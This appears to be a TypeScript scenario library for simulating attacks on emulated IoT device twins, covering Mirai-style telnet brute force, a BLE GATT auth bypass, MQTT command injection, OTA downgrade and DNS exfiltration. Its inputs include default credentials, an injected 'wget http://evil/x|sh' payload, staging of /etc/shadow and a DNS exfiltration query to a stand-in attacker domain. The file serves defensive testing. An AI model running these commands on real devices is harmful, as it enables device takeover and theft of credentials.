// Attack-simulation scenario library — each scenario performs REAL operations
// against a backend twin (boot → inputs → snapshots → crash), tagged with its
// embedded-threat property. Add new scenarios here; the runner executes them.
export type Step =
  | { kind: 'boot'; label: string }
  | { kind: 'input'; label: string; input: string }
  | { kind: 'snapshot'; label: string; note?: string }
  | { kind: 'crash'; label: string; reason: string };

export type Scenario = {
  id: string;
  name: string;
  emb3d: string;
  severity: 'critical' | 'high' | 'medium';
  arch: 'arm' | 'aarch64' | 'mipsel';
  description: string;
  steps: Step[];
};

export const SCENARIOS: Scenario[] = [
  {
    id: 'mirai-telnet',
    name: 'Mirai-style Telnet takeover',
    emb3d: 'EMB3D: default credentials · network-reachable service',
    severity: 'critical',
    arch: 'arm',
    description: 'Probe port 23, brute-force factory logins, land a root shell. The classic IoT killer, replayed safely.',
    steps: [
      { kind: 'boot', label: 'Boot victim twin (arm, telnetd up)' },
      { kind: 'input', label: 'Probe banner', input: 'telnet 192.168.1.50 23' },
      { kind: 'snapshot', label: 'Baseline before brute-force', note: 'pre-bruteforce' },
      { kind: 'input', label: 'Try admin:admin', input: 'admin admin' },
      { kind: 'input', label: 'Try root:xc3511', input: 'root xc3511' },
      { kind: 'crash', label: 'Root shell obtained', reason: 'unauthenticated root shell via default creds (simulated)' },
    ],
  },
  {
    id: 'gatt-bypass',
    name: 'BLE GATT auth bypass',
    emb3d: 'EMB3D: improper access control · out-of-order state transition',
    severity: 'high',
    arch: 'arm',
    description: 'Skip pairing by writing characteristics out of order — a state-machine bug, not a payload bug.',
    steps: [
      { kind: 'boot', label: 'Boot BLE peripheral twin' },
      { kind: 'input', label: 'Enumerate GATT (no pairing)', input: 'gatt list' },
      { kind: 'snapshot', label: 'Pre-exploit state', note: 'pre-gatt-write' },
      { kind: 'input', label: 'Write secure char pre-auth', input: 'gatt write 0x2a 41414141' },
      { kind: 'crash', label: 'Protected write accepted', reason: 'auth bypass: protected characteristic writable pre-pairing (simulated)' },
    ],
  },
  {
    id: 'mqtt-inject',
    name: 'MQTT command injection',
    emb3d: 'EMB3D: improper input validation · broker trust',
    severity: 'high',
    arch: 'aarch64',
    description: 'Publish a crafted topic payload that the subscriber passes to a shell.',
    steps: [
      { kind: 'boot', label: 'Boot gateway twin (MQTT subscriber up)' },
      { kind: 'input', label: 'Subscribe to cmd/#', input: 'mqtt sub cmd/#' },
      { kind: 'snapshot', label: 'Pre-injection state', note: 'pre-mqtt-publish' },
      { kind: 'input', label: 'Publish payload with $(…)', input: 'mqtt pub cmd/reboot "reboot; wget http://evil/x|sh"' },
      { kind: 'crash', label: 'Subscriber executed payload', reason: 'command injection via MQTT payload (simulated)' },
    ],
  },
  {
    id: 'ota-downgrade',
    name: 'Malicious OTA downgrade',
    emb3d: 'EMB3D: missing anti-rollback · insecure update',
    severity: 'critical',
    arch: 'aarch64',
    description: 'Serve a signed-but-ancient firmware and watch whether rollback protection refuses it.',
    steps: [
      { kind: 'boot', label: 'Boot twin on v2.4.1 (counter 9)' },
      { kind: 'input', label: 'Offer OTA v1.9.0 (signed, stale)', input: 'ota offer v1.9.0 counter=2' },
      { kind: 'snapshot', label: 'Pre-flash state', note: 'pre-ota-flash' },
      { kind: 'crash', label: 'Downgrade flashed', reason: 'anti-rollback bypass: stale image accepted (simulated)' },
    ],
  },
  {
    id: 'dns-exfil',
    name: 'DNS exfiltration channel',
    emb3d: 'EMB3D: covert channel · data staging',
    severity: 'medium',
    arch: 'mipsel',
    description: 'Smuggle staged data out inside DNS queries to an attacker resolver.',
    steps: [
      { kind: 'boot', label: 'Boot camera twin (mipsel)' },
      { kind: 'input', label: 'Stage /etc/shadow', input: 'stage /etc/shadow' },
      { kind: 'snapshot', label: 'Pre-exfil state', note: 'pre-dns-exfil' },
      { kind: 'input', label: 'Query chunked labels', input: 'dig a1b2c3.exfil.evil @8.8.8.8' },
      { kind: 'crash', label: 'Egress unfiltered', reason: 'data exfiltration over DNS unblocked (simulated)' },
    ],
  },
];
